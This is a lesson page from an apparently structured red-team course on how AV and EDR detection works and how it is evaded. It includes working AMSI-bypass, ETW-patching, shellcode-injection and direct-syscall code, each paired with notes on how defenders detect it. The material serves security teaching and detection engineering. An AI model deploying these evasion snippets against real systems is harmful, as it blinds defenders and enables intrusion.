---
title: "AV and EDR Evasion Concepts"
tags: [red-team, evasion, AV, EDR, AMSI, ETW, process-injection, obfuscation,
  Defender, Sysmon]
module: 08-RedTeam-01
day: 494
related_topics:
  - C2 Lab (Day 493)
  - Evasion Lab (Day 495)
  - Payload Development (Day 496)
  - Packers and Obfuscation (Day 451)
---

# Day 494 — AV and EDR Evasion Concepts

> "Detection is not binary. An EDR does not 'detect' or 'not detect' —
> it generates telemetry, correlates events, and fires a rule. Your job
> is to understand what telemetry each action generates and make sure
> it does not match any rule. You are not fighting a product. You are
> fighting a detection engineer's logic."
>
> — Ghost

---

## Goals

Understand how AV (signature-based) and EDR (behaviour-based) detections work.
Learn the mechanisms behind AMSI bypass, ETW patching, and process injection.
Map evasion techniques to specific detection gaps.
Understand the legal and ethical framework for evasion research.

**Prerequisites:** Day 493 (C2 lab), binary exploitation (Days 366–430), RE
(Days 431–490).
**Time budget:** 4–5 hours.

---

## Part 1 — How Detection Works (Understanding the Target)

### Antivirus (Signature-Based)

```
AV scans files and memory for known byte patterns (signatures).

Detection flow:
  File written to disk
    → AV driver intercepts via minifilter
    → Hash the file: check against cloud hash database
    → Scan for byte patterns: matches known malware signature?
    → If match: quarantine

Evasion implication:
  Change the bytes → signature no longer matches.
  Most AV is defeated by basic obfuscation or adding junk bytes.
```

### EDR (Behaviour-Based)

```
EDR hooks the OS at multiple levels to observe behaviour, not bytes.

Detection points:
  User mode:  DLL injection into every process (userland hooks on NTAPI)
  Kernel mode: ETW (Event Tracing for Windows) kernel telemetry
               Driver callbacks: process/thread/image load notifications
               Minifilter: file system monitoring
  Network:    Process-to-IP mapping, DNS queries

Detection flow:
  Process spawns → EDR sees CreateProcess event
  Process injects into another → EDR sees VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
  PowerShell runs → AMSI scans the script before execution
  Network connection → EDR logs (PID, exe, dest IP, port)
```

### The Detection Stack

```
Layer           What it catches              Bypass approach
──────────────────────────────────────────────────────────────
Static scan     File signatures              Obfuscate / pack / encrypt
AMSI            Script content (PS, .NET)    AMSI bypass (patch in-memory)
Userland hooks  NTAPI call sequences         Direct syscalls / unhooking
ETW providers   Kernel telemetry             ETW patching
Driver callbacks Process/thread creation     Can't bypass without kernel code
Network EDR     Connections by process       Traffic shaping / legitimate process
```

---

## Part 2 — AMSI Bypass

AMSI (Antimalware Scan Interface) is a Windows API that allows any AV/EDR to
scan script content before execution. PowerShell, VBScript, JScript, .NET, and
wscript all call AMSI before running code.

### How AMSI Works

```
PowerShell.exe → calls AmsiScanBuffer(content, length, ...) → AMSI DLL → AV driver
                   ↑
                 if AV says "malicious" → PowerShell throws an error and stops
```

### AMSI Bypass: Patch AmsiScanBuffer in Memory

The simplest bypass: overwrite the start of `AmsiScanBuffer` with instructions
that make it always return "clean" (return value 1 = AMSI_RESULT_CLEAN).

```powershell
# PowerShell AMSI bypass (in-memory patch)
# This is heavily detected — shown for educational understanding only
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

```csharp
// C# .NET bypass: patch the AmsiScanBuffer function directly
// Find the address of AmsiScanBuffer in amsi.dll
// Write: ret (0xC3) or xor eax,eax; ret
byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
// ^ mov eax, 0x80070057 (E_INVALIDARG) ; ret  → AMSI returns error, scan not done
// Apply via VirtualProtect + Marshal.Copy
```

**Detection by blue team:**
- EDR monitors writes to memory regions containing `amsi.dll`.
- Writing to executable code memory from a script process is suspicious.
- Most modern EDRs detect common AMSI bypass patterns at the ETW level.

### AMSI Bypass: Obfuscate the Pattern

AMSI scans strings. If your PowerShell payload does not contain recognisable
malicious strings, AMSI may not flag it.

```powershell
# Simple obfuscation: split and concat strings at runtime
$cmd = 'Inv' + 'oke-Mimikatz'
# But: AMSI scans the final string after concatenation in PowerShell 5+

# Better: use encoding to reconstruct at runtime
[System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String('SW52b2tlLU1pbWlrYXR6')
)
# ^ = 'Invoke-Mimikatz' — but this pattern is also known
```

**Operational reality:** AMSI is a cat-and-mouse game. New bypasses emerge
constantly. In an engagement, test your bypass against the specific EDR version
in the client environment before relying on it.

---

## Part 3 — ETW Patching

Event Tracing for Windows (ETW) is the kernel's telemetry pipeline. EDRs
subscribe to ETW providers to receive real-time events about process activity,
network, and file system.

### Key ETW Providers for Security

```
Microsoft-Windows-Threat-Intelligence (MSTI)
  → Reports: VirtualAllocEx, WriteProcessMemory, ReadProcessMemory, SetThreadContext
  → The most important EDR telemetry source for process injection detection

Microsoft-Antimalware-Scan-Interface
  → Reports: every AMSI scan event and result

Microsoft-Windows-PowerShell
  → Reports: PowerShell script blocks (full content) even when obfuscated
```

### ETW Patching (User Mode)

ETW events are sent via `EtwEventWrite` in `ntdll.dll`. Patching this function
stops the current process from emitting any ETW events.

```c
// Patch EtwEventWrite: overwrite with ret (0xC3)
// Effect: this process no longer sends ETW events
// Detection: patching executable memory in ntdll is suspicious
PVOID func = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
DWORD oldprotect;
VirtualProtect(func, 1, PAGE_EXECUTE_READWRITE, &oldprotect);
*(BYTE*)func = 0xC3;  // RET
VirtualProtect(func, 1, oldprotect, &oldprotect);
```

**Detection by blue team:**
- Memory writes to ntdll.dll code sections.
- Absence of ETW events from a process that should generate them
  (an anomaly — "process running but no telemetry" is suspicious).

### Kernel ETW (harder)

Modern EDRs subscribe to kernel-level ETW providers (MSTI) that cannot be
bypassed from user mode without kernel code (a driver). This is the current
state-of-the-art detection layer.

---

## Part 4 — Process Injection

Process injection moves your payload into a legitimate process to avoid
process-level detection. Instead of `malware.exe` connecting to C2, it is
`explorer.exe` or `svchost.exe` making the connection.

### Classic Injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)

```c
// Inject shellcode into a target process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

// 1. Allocate memory in target
LPVOID remote_buf = VirtualAllocEx(hProcess, NULL, shellcode_size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);

// 2. Write shellcode
WriteProcessMemory(hProcess, remote_buf, shellcode, shellcode_size, NULL);

// 3. Execute in new thread
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                    (LPTHREAD_START_ROUTINE)remote_buf,
                                    NULL, 0, NULL);
```

**Detection:** VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
from a suspicious process is a textbook EDR alert.

### Less-Detectable Injection Variants

| Technique | How | Detection difficulty |
|---|---|---|
| **QueueUserAPC** | Queue an APC to an existing thread | Medium |
| **Thread hijacking** | Suspend thread, change RIP, resume | Medium |
| **Process hollowing** | Create suspended process, hollow out, map payload | Medium-High |
| **Reflective DLL injection** | Load a DLL into memory without LoadLibrary | High |
| **Module stomping** | Overwrite a legitimate DLL loaded in the target | High |
| **Phantom DLL hollowing** | Map a clean DLL, remap it to shellcode | High |
| **Direct syscalls** | Bypass userland hooks, call kernel directly | High |

---

## Part 5 — Direct Syscalls (Bypassing Userland Hooks)

EDRs inject a DLL into every process. That DLL hooks NTAPI functions
(NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.) to intercept calls.

**Direct syscalls bypass** this by calling the kernel directly, skipping the
hooked NTAPI functions entirely.

```asm
; Direct syscall: NtAllocateVirtualMemory (syscall number for Windows 11: 0x18)
; Instead of calling ntdll!NtAllocateVirtualMemory (hooked by EDR):
; Call the kernel directly

NtAllocateVirtualMemory_direct:
    mov r10, rcx          ; syscall ABI: first arg in r10
    mov eax, 0x18         ; NtAllocateVirtualMemory syscall number
    syscall               ; enter kernel mode directly
    ret
```

**Tools:** SysWhispers2, SysWhispers3 — generate direct syscall stubs for all
NTAPI functions automatically.

**Detection:** Syscall numbers must be resolved at runtime (they change between
Windows versions). EDRs detect hardcoded syscall numbers or suspicious
`syscall` instructions outside ntdll.dll.

---

## Part 6 — Detection and Evasion as a Feedback Loop

```
Red team action → generates telemetry → EDR rule fires or does not
                                              ↓
                           If fires: adapt the technique
                           If not: note the gap; use in engagement

After engagement: blue team patches the gap
                  Red team needs new technique next time
```

This is the purple team value: red team findings drive blue team rule improvements.
Every successful evasion is a detection gap. The report names it.

---

## Key Takeaways

1. AV detects patterns. EDR detects behaviour. They require different evasion
   strategies: changing bytes defeats AV; changing the call sequence or using
   direct syscalls is needed for EDR.
2. AMSI scans script content before execution. Patching or obfuscating the
   content are the two bypass paths. Both are increasingly detected.
3. ETW is the kernel's telemetry pipeline. User-mode ETW patching stops your
   process from reporting — but the absence of telemetry is itself suspicious
   to a mature SOC.
4. Process injection moves your payload into a trusted process. Classic injection
   (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread) is detected by
   every modern EDR. Use less-common variants with OpSec justification.
5. Direct syscalls bypass userland hooks. This is the current state-of-the-art
   for injection evasion. EDRs are adapting with kernel-level callbacks that
   direct syscalls cannot bypass.

---

## Exercises

1. Research and list the exact ETW events generated by VirtualAllocEx and
   CreateRemoteThread. Which ETW provider emits them? Which EDR products
   subscribe to that provider?
2. Implement a basic process injection in C using the classic
   VirtualAllocEx + WriteProcessMemory + CreateRemoteThread pattern. Test it
   against Windows Defender in a VM. Note what alert (if any) is generated.
3. Use SysWhispers3 to generate direct syscall stubs for NtAllocateVirtualMemory
   and NtWriteVirtualMemory. Replace the standard WINAPI calls in your injector.
   Does Defender generate the same alert?
4. Write a Sigma rule that would detect the ETW events from a classic process
   injection sequence. What field values would you match on?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q494.1, Q494.2 …).

---

## Navigation

← Previous: [Day 493 — C2 Lab: Sliver](DAY-0493-C2-Lab-Cobalt-Strike-Sliver.md)
→ Next: [Day 495 — Evasion Lab](DAY-0495-Evasion-Lab.md)
